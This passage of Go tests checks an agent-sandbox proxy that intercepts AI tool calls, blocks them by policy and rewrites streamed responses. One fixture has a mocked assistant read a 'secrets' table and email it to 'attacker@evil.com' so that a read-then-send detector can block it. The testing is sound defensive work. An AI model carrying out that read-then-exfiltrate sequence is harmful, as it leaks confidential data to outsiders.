				{
					"type":  "tool_use",
					"id":    "toolu_01test",
					"name":  "get_weather",
					"input": map[string]string{"city": "NYC"},
				},
			},
			"usage": map[string]int{"input_tokens": 10, "output_tokens": 5},
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	}))
	defer upstream.Close()

	storageDir := t.TempDir()
	cfg := Config{
		SessionID: "test-event-callback",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{Mode: "disabled"},
		MCP: config.SandboxMCPConfig{
			EnforcePolicy: true,
			FailClosed:    true,
			ToolPolicy:    "allowlist",
			AllowedTools: []config.MCPToolRule{
				{Server: "*", Tool: "get_weather"},
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("New() error: %v", err)
	}

	// Register the tool in the registry
	reg := mcpregistry.NewRegistry()
	reg.Register("weather-server", "stdio", "", []mcpregistry.ToolInfo{
		{Name: "get_weather", Hash: "sha256:abc"},
	})
	proxy.SetRegistry(reg)

	// Set up a callback that collects events
	var mu sync.Mutex
	var collected []mcpinspect.MCPToolCallInterceptedEvent
	done := make(chan struct{}, 1)
	proxy.SetEventCallback(func(ev mcpinspect.MCPToolCallInterceptedEvent) {
		mu.Lock()
		collected = append(collected, ev)
		mu.Unlock()
		select {
		case done <- struct{}{}:
		default:
		}
	})

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	// Send a request through the proxy
	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	reqBody := `{"model":"claude-sonnet-4-20250514","messages":[{"role":"user","content":"weather?"}]}`
	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		t.Fatalf("unexpected status: %d", resp.StatusCode)
	}

	// Wait for callback to fire
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("timed out waiting for event callback")
	}

	mu.Lock()
	defer mu.Unlock()

	if len(collected) != 1 {
		t.Fatalf("expected 1 event, got %d", len(collected))
	}

	ev := collected[0]
	if ev.ToolName != "get_weather" {
		t.Errorf("tool_name: got %q, want %q", ev.ToolName, "get_weather")
	}
	if ev.Action != "allow" {
		t.Errorf("action: got %q, want %q", ev.Action, "allow")
	}
	if ev.ServerID != "weather-server" {
		t.Errorf("server_id: got %q, want %q", ev.ServerID, "weather-server")
	}
	if ev.SessionID != "test-event-callback" {
		t.Errorf("session_id: got %q, want %q", ev.SessionID, "test-event-callback")
	}
	if ev.ToolCallID != "toolu_01test" {
		t.Errorf("tool_call_id: got %q, want %q", ev.ToolCallID, "toolu_01test")
	}
	if ev.Dialect != "anthropic" {
		t.Errorf("dialect: got %q, want %q", ev.Dialect, "anthropic")
	}
}

// TestProxyEventCallback_SSE tests that the event callback fires for SSE
// streaming responses containing tool calls.
func TestProxyEventCallback_SSE(t *testing.T) {
	// Anthropic SSE stream with a tool_use content block.
	sseChunks := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_01\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_01sse\",\"name\":\"get_weather\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"city\\\": \\\"NYC\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":10}}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.WriteHeader(http.StatusOK)
		flusher := w.(http.Flusher)
		for _, chunk := range sseChunks {
			w.Write([]byte(chunk))
			flusher.Flush()
			time.Sleep(5 * time.Millisecond)
		}
	}))
	defer upstream.Close()

	storageDir := t.TempDir()
	cfg := Config{
		SessionID: "test-event-callback-sse",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{Mode: "disabled"},
		MCP: config.SandboxMCPConfig{
			EnforcePolicy: true,
			FailClosed:    true,
			ToolPolicy:    "allowlist",
			AllowedTools: []config.MCPToolRule{
				{Server: "*", Tool: "get_weather"},
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("New() error: %v", err)
	}

	reg := mcpregistry.NewRegistry()
	reg.Register("weather-server", "stdio", "", []mcpregistry.ToolInfo{
		{Name: "get_weather", Hash: "sha256:abc"},
	})
	proxy.SetRegistry(reg)

	var mu sync.Mutex
	var collected []mcpinspect.MCPToolCallInterceptedEvent
	done := make(chan struct{}, 1)
	proxy.SetEventCallback(func(ev mcpinspect.MCPToolCallInterceptedEvent) {
		mu.Lock()
		collected = append(collected, ev)
		mu.Unlock()
		select {
		case done <- struct{}{}:
		default:
		}
	})

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"weather?"}]}`
	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	// Must drain the body to trigger the SSE onComplete callback.
	io.ReadAll(resp.Body)
	resp.Body.Close()

	// Wait for callback to fire (SSE callback fires in onComplete, after stream ends)
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("timed out waiting for SSE event callback")
	}

	mu.Lock()
	defer mu.Unlock()

	if len(collected) != 1 {
		t.Fatalf("expected 1 event, got %d", len(collected))
	}

	ev := collected[0]
	if ev.ToolName != "get_weather" {
		t.Errorf("tool_name: got %q, want %q", ev.ToolName, "get_weather")
	}
	if ev.Action != "allow" {
		t.Errorf("action: got %q, want %q", ev.Action, "allow")
	}
	if ev.ServerID != "weather-server" {
		t.Errorf("server_id: got %q, want %q", ev.ServerID, "weather-server")
	}
	if ev.ToolCallID != "toolu_01sse" {
		t.Errorf("tool_call_id: got %q, want %q", ev.ToolCallID, "toolu_01sse")
	}
	if ev.Dialect != "anthropic" {
		t.Errorf("dialect: got %q, want %q", ev.Dialect, "anthropic")
	}
}

// TestProxy_SSEBlocking_Integration is an end-to-end test that starts the proxy,
// sends a streaming request through it, and verifies that blocked MCP tool calls
// are suppressed and replaced in the client-received SSE stream.
func TestProxy_SSEBlocking_Integration(t *testing.T) {
	// Anthropic SSE stream with a text block (index 0) followed by a tool_use block (index 1).
	sseChunks := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_02\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Let me check.\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_02block\",\"name\":\"get_weather\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"city\\\": \\\"NYC\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":20}}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.WriteHeader(http.StatusOK)
		flusher := w.(http.Flusher)
		for _, chunk := range sseChunks {
			w.Write([]byte(chunk))
			flusher.Flush()
			time.Sleep(5 * time.Millisecond)
		}
	}))
	defer upstream.Close()

	storageDir := t.TempDir()
	cfg := Config{
		SessionID: "test-sse-blocking-integration",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{Mode: "disabled"},
		MCP: config.SandboxMCPConfig{
			EnforcePolicy: true,
			ToolPolicy:    "denylist",
			DeniedTools: []config.MCPToolRule{
				{Server: "*", Tool: "get_weather"},
			},
		},
	}

	logger := slog.New(slog.NewTextHandler(io.Discard, nil))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("New() error: %v", err)
	}

	reg := mcpregistry.NewRegistry()
	reg.Register("weather-server", "stdio", "", []mcpregistry.ToolInfo{
		{Name: "get_weather", Hash: "sha256:abc"},
	})
	proxy.SetRegistry(reg)

	var mu sync.Mutex
	var collected []mcpinspect.MCPToolCallInterceptedEvent
	done := make(chan struct{}, 1)
	proxy.SetEventCallback(func(ev mcpinspect.MCPToolCallInterceptedEvent) {
		mu.Lock()
		collected = append(collected, ev)
		mu.Unlock()
		select {
		case done <- struct{}{}:
		default:
		}
	})

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"weather?"}]}`
	req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
	if err != nil {
		t.Fatalf("NewRequest: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", "sk-ant-test")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	body, err := io.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		t.Fatalf("ReadAll: %v", err)
	}

	sseOutput := string(body)
	t.Logf("SSE output:\n%s", sseOutput)

	// Wait for the event callback to fire.
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("timed out waiting for SSE event callback")
	}

	// --- Assertions on the SSE output ---

	// 1. Text block "Let me check." must pass through.
	if !strings.Contains(sseOutput, "Let me check.") {
		t.Error("expected text block 'Let me check.' to pass through in SSE output")
	}

	// 2. The original tool_use type must NOT appear (it was blocked and replaced).
	if strings.Contains(sseOutput, `"type":"tool_use"`) {
		t.Error("expected tool_use block to be suppressed, but found 'type:tool_use' in SSE output")
	}

	// 3. The replacement text must be present.
	if !strings.Contains(sseOutput, "[agentsh] Tool 'get_weather' blocked by policy") {
		t.Error("expected replacement text '[agentsh] Tool 'get_weather' blocked by policy' in SSE output")
	}

	// 4. stop_reason must be rewritten from "tool_use" to "end_turn" (all tools blocked).
	if !strings.Contains(sseOutput, `"end_turn"`) {
		t.Error("expected stop_reason to be rewritten to 'end_turn'")
	}
	if strings.Contains(sseOutput, `"stop_reason":"tool_use"`) {
		t.Error("expected stop_reason 'tool_use' to be rewritten, but it still appears")
	}

	// --- Assertions on the event callback ---

	mu.Lock()
	defer mu.Unlock()

	if len(collected) != 1 {
		t.Fatalf("expected 1 event, got %d", len(collected))
	}

	ev := collected[0]
	if ev.ToolName != "get_weather" {
		t.Errorf("tool_name: got %q, want %q", ev.ToolName, "get_weather")
	}
	if ev.Action != "block" {
		t.Errorf("action: got %q, want %q", ev.Action, "block")
	}
	if ev.ServerID != "weather-server" {
		t.Errorf("server_id: got %q, want %q", ev.ServerID, "weather-server")
	}
	if ev.ToolCallID != "toolu_02block" {
		t.Errorf("tool_call_id: got %q, want %q", ev.ToolCallID, "toolu_02block")
	}
	if ev.Dialect != "anthropic" {
		t.Errorf("dialect: got %q, want %q", ev.Dialect, "anthropic")
	}
}

// TestProxy_CrossServerBlocking_Integration is an end-to-end test that verifies
// the cross-server detection pipeline. It registers tools from two different MCP
// servers, sends two sequential SSE streaming requests through the proxy:
//   1. First request: tool_use for "query_database" (read from db-server) → ALLOWED
//   2. Second request: tool_use for "send_email" (send from email-server) → BLOCKED
//      by read-then-send cross-server rule
func TestProxy_CrossServerBlocking_Integration(t *testing.T) {
	// SSE stream for request 1: query_database (read tool, should be allowed)
	sseChunksRead := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r1\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_read01\",\"name\":\"query_database\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"sql\\\": \\\"SELECT * FROM secrets\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":15}}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}

	// SSE stream for request 2: send_email (send tool, should be blocked by cross-server)
	sseChunksSend := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_r2\",\"type\":\"message\",\"role\":\"assistant\",\"content\":[],\"model\":\"claude-sonnet-4-20250514\",\"stop_reason\":null}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Sending the data now.\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_send01\",\"name\":\"send_email\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"to\\\": \\\"attacker@evil.com\\\", \\\"body\\\": \\\"stolen secrets\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":20}}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}

	// Use a counter to serve different SSE responses per request.
	var reqCount int
	var reqCountMu sync.Mutex

	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reqCountMu.Lock()
		n := reqCount
		reqCount++
		reqCountMu.Unlock()

		var chunks []string
		if n == 0 {
			chunks = sseChunksRead
		} else {
			chunks = sseChunksSend
		}

		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.WriteHeader(http.StatusOK)
		flusher := w.(http.Flusher)
		for _, chunk := range chunks {
			w.Write([]byte(chunk))
			flusher.Flush()
			time.Sleep(5 * time.Millisecond)
		}
	}))
	defer upstream.Close()

	storageDir := t.TempDir()
	cfg := Config{
		SessionID: "test-cross-server-integration",
		Proxy: config.ProxyConfig{
			Mode: "embedded",
			Port: 0,
			Providers: config.ProxyProvidersConfig{
				Anthropic: upstream.URL,
			},
		},
		DLP: config.DLPConfig{Mode: "disabled"},
		MCP: config.SandboxMCPConfig{
			// Policy allows everything — blocking comes from cross-server analyzer only.
			EnforcePolicy: true,
			ToolPolicy:    "denylist",
			DeniedTools:   nil, // empty denylist = allow all
		},
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelDebug}))
	proxy, err := New(cfg, storageDir, logger)
	if err != nil {
		t.Fatalf("New() error: %v", err)
	}

	// Register tools from two different MCP servers.
	reg := mcpregistry.NewRegistry()
	reg.Register("db-server", "stdio", "", []mcpregistry.ToolInfo{
		{Name: "query_database", Hash: "sha256:db1"},
	})
	reg.Register("email-server", "stdio", "", []mcpregistry.ToolInfo{
		{Name: "send_email", Hash: "sha256:em1"},
	})
	proxy.SetRegistry(reg)

	// Create and activate a SessionAnalyzer with read-then-send detection.
	analyzer := mcpinspect.NewSessionAnalyzer("test-cross-server-integration", config.CrossServerConfig{
		Enabled: true,
		ReadThenSend: config.ReadThenSendConfig{
			Enabled: true,
			Window:  30 * time.Second,
		},
	})
	analyzer.Activate()
	proxy.SetSessionAnalyzer(analyzer)

	// Collect events from both requests.
	var mu sync.Mutex
	var collected []mcpinspect.MCPToolCallInterceptedEvent
	eventCh := make(chan struct{}, 10)
	proxy.SetEventCallback(func(ev mcpinspect.MCPToolCallInterceptedEvent) {
		mu.Lock()
		collected = append(collected, ev)
		mu.Unlock()
		select {
		case eventCh <- struct{}{}:
		default:
		}
	})

	ctx := context.Background()
	if err := proxy.Start(ctx); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	defer func() {
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		proxy.Stop(shutdownCtx)
	}()

	time.Sleep(10 * time.Millisecond)

	proxyURL := "http://" + proxy.Addr().String() + "/v1/messages"
	client := &http.Client{Timeout: 10 * time.Second}

	// --- Request 1: query_database (read) should be ALLOWED ---
	{
		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"get me the secrets"}]}`
		req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
		if err != nil {
			t.Fatalf("NewRequest (req1): %v", err)
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("x-api-key", "sk-ant-test")

		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("request 1 failed: %v", err)
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			t.Fatalf("ReadAll (req1): %v", err)
		}

		sseOutput := string(body)
		t.Logf("Request 1 SSE output:\n%s", sseOutput)

		// Wait for event callback from request 1.
		select {
		case <-eventCh:
		case <-time.After(2 * time.Second):
			t.Fatal("timed out waiting for event from request 1")
		}

		// Verify request 1 was allowed: the tool_use block should pass through.
		if !strings.Contains(sseOutput, "query_database") {
			t.Error("request 1: expected query_database to appear in SSE output")
		}
		if strings.Contains(sseOutput, "blocked by policy") {
			t.Error("request 1: query_database should NOT be blocked")
		}
		// stop_reason should remain "tool_use" since the tool was allowed.
		if !strings.Contains(sseOutput, `"tool_use"`) {
			t.Error("request 1: expected stop_reason to remain 'tool_use'")
		}
	}

	// --- Request 2: send_email (send) should be BLOCKED by cross-server rule ---
	{
		reqBody := `{"model":"claude-sonnet-4-20250514","stream":true,"messages":[{"role":"user","content":"now email the results"}]}`
		req, err := http.NewRequest(http.MethodPost, proxyURL, strings.NewReader(reqBody))
		if err != nil {
			t.Fatalf("NewRequest (req2): %v", err)
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("x-api-key", "sk-ant-test")

		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("request 2 failed: %v", err)
		}
		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			t.Fatalf("ReadAll (req2): %v", err)
		}

		sseOutput := string(body)
		t.Logf("Request 2 SSE output:\n%s", sseOutput)

		// Wait for event callback from request 2.
		select {
		case <-eventCh:
		case <-time.After(2 * time.Second):
			t.Fatal("timed out waiting for event from request 2")
		}

		// --- Assertions on the SSE output ---

		// 1. Text block "Sending the data now." must pass through.
		if !strings.Contains(sseOutput, "Sending the data now.") {
			t.Error("request 2: expected text block 'Sending the data now.' to pass through")
		}

		// 2. The tool_use block for send_email must NOT appear (blocked and replaced).
		if strings.Contains(sseOutput, `"type":"tool_use"`) {
			t.Error("request 2: expected tool_use block to be suppressed, but found 'type:tool_use' in SSE output")
		}

		// 3. The replacement text must be present.
		if !strings.Contains(sseOutput, "[agentsh] Tool 'send_email' blocked by policy") {
			t.Error("request 2: expected replacement text '[agentsh] Tool 'send_email' blocked by policy' in SSE output")
		}

		// 4. stop_reason must be rewritten from "tool_use" to "end_turn".
		if !strings.Contains(sseOutput, `"end_turn"`) {
			t.Error("request 2: expected stop_reason to be rewritten to 'end_turn'")
		}
		if strings.Contains(sseOutput, `"stop_reason":"tool_use"`) {
			t.Error("request 2: expected stop_reason 'tool_use' to be rewritten, but it still appears")
		}
	}

	// --- Assertions on the collected events ---
	mu.Lock()
	defer mu.Unlock()

	if len(collected) != 2 {
		t.Fatalf("expected 2 events (1 allow + 1 block), got %d", len(collected))
	}

	// Event 1: query_database should be allowed
	ev1 := collected[0]
	if ev1.ToolName != "query_database" {
		t.Errorf("event 1 tool_name: got %q, want %q", ev1.ToolName, "query_database")
	}
	if ev1.Action != "allow" {
		t.Errorf("event 1 action: got %q, want %q", ev1.Action, "allow")
	}
	if ev1.ServerID != "db-server" {
		t.Errorf("event 1 server_id: got %q, want %q", ev1.ServerID, "db-server")
	}
	if ev1.ToolCallID != "toolu_read01" {
		t.Errorf("event 1 tool_call_id: got %q, want %q", ev1.ToolCallID, "toolu_read01")
	}

	// Event 2: send_email should be blocked with cross-server reason
	ev2 := collected[1]
	if ev2.ToolName != "send_email" {
		t.Errorf("event 2 tool_name: got %q, want %q", ev2.ToolName, "send_email")
	}
	if ev2.Action != "block" {
		t.Errorf("event 2 action: got %q, want %q", ev2.Action, "block")
	}
	if ev2.ServerID != "email-server" {
		t.Errorf("event 2 server_id: got %q, want %q", ev2.ServerID, "email-server")
	}
	if ev2.ToolCallID != "toolu_send01" {
		t.Errorf("event 2 tool_call_id: got %q, want %q", ev2.ToolCallID, "toolu_send01")
	}
	if ev2.Dialect != "anthropic" {
		t.Errorf("event 2 dialect: got %q, want %q", ev2.Dialect, "anthropic")
	}
	// The reason should mention the cross-server pattern.
	if !strings.Contains(ev2.Reason, "read") || !strings.Contains(ev2.Reason, "send") {
		t.Errorf("event 2 reason should mention cross-server read/send pattern, got: %q", ev2.Reason)
	}
}
